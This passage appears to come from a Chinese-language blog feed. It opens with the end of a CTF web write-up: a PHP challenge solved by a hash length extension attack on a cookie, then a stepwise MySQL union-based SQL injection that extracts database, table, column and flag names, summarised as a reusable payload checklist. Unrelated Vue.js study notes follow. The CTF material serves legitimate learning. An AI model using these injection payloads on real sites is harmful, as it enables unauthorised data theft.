class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &lt;/pre&gt;</span><br><span class="line">&lt;h1&gt;Admins Only!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;<span class="keyword">If</span> you have the correct credentials, log in below. <span class="keyword">If</span> not, please LEAVE.&lt;/p&gt;</span><br><span class="line">&lt;form method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    Username: &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt; &lt;br&gt;</span><br><span class="line">    Password: &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt; &lt;br&gt;</span><br><span class="line">    &lt;button type=<span class="string">"submit"</span>&gt;Submit&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>需要构造一个符合<br><code>$COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))</code><br><code>setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</code><br>的getmein条件<br><code>$secret</code>为长度15的字符串，构造一个前面为<code>xxxxxxxxxxxxxxxadminadmin</code>的大于64位的字符串，得到其hash值</p>
<p>Hash拓展长度攻击</p>
<hr>
<h2 id="这个看起来有点简单！"><a href="#这个看起来有点简单！" class="headerlink" title="这个看起来有点简单！"></a>这个看起来有点简单！</h2><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a></p>
<p>输入1’ ，报错：mysql_fetch_array() expects parameter 1 to be resource, boolean given in C:\h43a1W3\phpstudy\WWW\8\index.php on line 35<br>继续输入  and 1=1，没报错,and 1=2，返回空表，存在注入<br>order by 1,2 没报错，3报错<br>查数据库  <code>and 1=2 union select 1,database()</code>  查出表my_db<br>查数据库版本 <code>and 1=2 union select 1,version()</code>      5.5.47<br>接着查表 <code>and 1=2 union select 1, table_name from information_schema.tables</code><br>出现 news  thiskey  admin  三个关键字段名<br>查列 <code>and 1=2 union select 1, column_name from information_schema.columns where table_schema=&#39;my_db&#39; and table_name=&#39;thiskey&#39;</code>  得到字段k0y<br>然后查flag  <code>and 1=2 union select 1, k0y from thiskey</code></p>
<hr>
<h3 id="以上的总结"><a href="#以上的总结" class="headerlink" title="以上的总结"></a>以上的总结</h3><p>遇到有sql注入提示的题目：</p>
<ol>
<li><code>and 1=1</code>  <code>and 1=2</code>  检验是否存在sql注入</li>
<li>查数据库  <code>and 1=2 union select 1,database()</code></li>
<li>查数据库版本 <code>and 1=2 union select 1,version()</code></li>
<li>查表 <code>and 1=2 union select 1, table_name from information_schema.tables</code></li>
<li>查列 <code>and 1=2 union select 1, column_name from information_schema.columns where table_schema=&#39;&#39; and table_name=&#39;&#39;</code></li>
<li>查flag  <code>and 1=2 union select 1,  from</code></li>
</ol>
<hr>
]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Vue速学笔记]]></title>
      <url>/%E7%AC%94%E8%AE%B0/ckwd5ws8j003kd0ucojle3390/</url>
      <content type="html"><![CDATA[<p>#Vue.js 2.0 笔记</p>
<hr>
<p>###流程</p>
<ol>
<li>基础知识 </li>
<li>案例实践</li>
<li>TodoList</li>
<li>Vue-cli</li>
<li>TodoList<a id="more"></a>
</li>
</ol>
<hr>
<p>###学习开始</p>
<ol>
<li>创建第一个Vue实例</li>
</ol>
<ul>
<li><a href="https://cn.vuejs.org" target="_blank" rel="noopener">Vue</a>–&gt;学习–&gt;教程–&gt;安装–&gt;直接用<script>引入–&gt;<strong>开发版本</strong>，生产版本，CDN</li>
<li>将源码复制到一个vue.js文件–&gt;在html文件里，head部分–&gt;<script src="./vue.js"></script></li>
<li>一个Vue实例<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            msg:<span class="string">"hello world"</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ol start="2">
<li>挂载点，模板与实例</li>
</ol>
<ul>
<li>Vue实例的挂载点<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span> //挂载点</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello &#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //模板, &#123;&#123; &#125;&#125;是插值表达式,是最安全也最基本的表达方式 </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123; <span class="comment">//实例</span></span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>, <span class="comment">//结点</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        template:'<span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello </span><span class="template-variable">&#123;&#123;msg&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span>'</span></span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            msg:<span class="string">"hello world"</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ol start="3">
<li>Vue实例中的数据，事件和方法</li>
</ol>
<ul>
<li><p>插值表达式</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;number&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>  //插值表达式 </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123; </span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>, </span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            msg:<span class="string">"world"</span></span></span><br><span class="line">            number:123</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>v-text(转义) 与 v-html（不转义）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-html</span>=<span class="string">"content"</span> &gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123; </span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>, </span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="handlebars"><span class="xml">            content:"<span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>"</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>实例 方法 函数</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-on:click</span>=<span class="string">"handleClick"</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  //监听dom事件,简写：v-on = @</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123; </span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>, </span></span><br><span class="line"><span class="actionscript">        data:&#123;  <span class="comment">//数据对象</span></span></span><br><span class="line"><span class="actionscript">            content:<span class="string">"hello"</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="actionscript">        methods:&#123; <span class="comment">//方法</span></span></span><br><span class="line"><span class="actionscript">            handleClick: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;  <span class="comment">//函数</span></span></span><br><span class="line"><span class="actionscript">                alert(<span class="number">123</span>) <span class="comment">//hello点击变成123</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.content = <span class="string">"world"</span> <span class="comment">//hello变成world</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> @<span class="attr">click</span>=<span class="string">"handleClick"</span>&gt;</span>&#123;&#123;content&#125;&#125;  //简写：v-on = @</span><br><span class="line">//<span class="tag">&lt;<span class="name">div</span> <span class="attr">v-text</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">//&#123;&#123;content&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123; </span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>, </span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            content:<span class="string">"hello"</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="actionscript">            handleClick: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">//alert(123)</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.content = <span class="string">"world"</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<ol>
<li>Vue中的属性绑定和双向数据绑定</li>
</ol>
<ul>
<li><p>属性绑定(单向)<br>数据决定页面的显示，页面无法决定数据的内容</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">:title</span>=<span class="string">"'dell lee' + title"</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">div</span>&gt;</span> //提示语，数据绑定 = ""里是js表达式，简写：v-bind = ：</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            title:<span class="string">"this is hello world"</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>双向数据绑定</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">:title</span>=<span class="string">"title"</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"content"</span>/&gt;</span>  //输入内容时下方div里绑定的content内容也改变</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            title:<span class="string">"this is hello world"</span></span></span><br><span class="line"><span class="actionscript">            content:<span class="string">"this is content"</span>  <span class="comment">//两个content绑定</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ol start="5">
<li>Vue中的计算属性和侦听器</li>
</ol>
<ul>
<li><p>计算属性</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"firstName"</span> /&gt;</span></span><br><span class="line">名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"lastName"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>，</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            firstName:<span class="string">''</span>,</span></span><br><span class="line"><span class="actionscript">            lastName:<span class="string">''</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="actionscript">        <span class="comment">//reselect</span></span></span><br><span class="line"><span class="actionscript">        computed:&#123;  <span class="comment">//计算属性会记录缓存值</span></span></span><br><span class="line"><span class="actionscript">            fullName: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> <span class="keyword">this</span>.firstName + <span class="string">''</span> + <span class="keyword">this</span>.lastName</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>侦听器</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"firstName"</span> /&gt;</span></span><br><span class="line">名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"lastName"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;count&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span>，</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            firstName:<span class="string">''</span>,</span></span><br><span class="line"><span class="actionscript">            lastName:<span class="string">''</span>,</span></span><br><span class="line">            count: 0</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="actionscript">        <span class="comment">//reselect</span></span></span><br><span class="line">        computed:&#123;</span><br><span class="line"><span class="actionscript">            fullName: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> <span class="keyword">this</span>.firstName + <span class="string">''</span> + <span class="keyword">this</span>.lastName</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        watch:&#123;</span><br><span class="line"><span class="actionscript">            fullName: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> <span class="keyword">this</span>.firstName + <span class="string">''</span> + <span class="keyword">this</span>.lastName</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="actionscript">            <span class="comment">//firstName: function() &#123;</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.count ++</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="actionscript">            <span class="comment">//lastName: function() &#123;</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.count ++</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ol start="6">
<li>v-if,v-show与v-for指令</li>
</ol>
<ul>
<li><p>v-if(控制dom的存在与否，一次性较佳) 与 v-show（控制dom的显示与否，优先使用，性能高）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-show</span>=<span class="string">"show"</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleClick"</span>&gt;</span>toggle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span></span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            show: <span class="literal">true</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="actionscript">            handleClick: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.show = !<span class="keyword">this</span>.show;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>v-for</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-show</span>=<span class="string">"show"</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleClick"</span>&gt;</span>toggle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"（item，index) of list"</span> <span class="attr">:key</span>=<span class="string">"index"</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span>  //数据循环展示,:key=""提高性能，列表渲染，循环值不相同</span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#root"</span></span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            show: <span class="literal">true</span>,</span></span><br><span class="line">            list:[1,2,3]</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="actionscript">            handleClick: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span 